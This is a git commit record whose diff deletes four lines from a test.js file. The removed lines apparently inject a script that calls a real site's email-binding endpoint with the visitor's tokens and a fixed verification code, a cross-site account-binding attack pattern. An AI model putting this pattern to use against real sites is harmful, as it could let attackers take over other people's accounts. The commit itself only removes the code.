a239e9336fc1d33f9255ef361880999d73c83b5d
ruchublog <78971712+ruchublog@users.noreply.github.com>
2023-03-11 21:08:00 +0800

    Update test.html

--- test.js
+++
@@ -1,4 +0,0 @@
-window.emailcode="000000";
-script4 = document.createElement("script");
-script4.src = "https://cloud-passport.anjuke.com/sec/ajk/email/pc/bind?source=ajk-anjuke-pc&tokencode="+window.tokencode+"&token="+window.token+"&emailcode="+window.emailcode+"&email="+window.email+"&psdk-d=jsdk&psdk-v=1.0.1&callback=console.log";
-head.appendChild(script4);
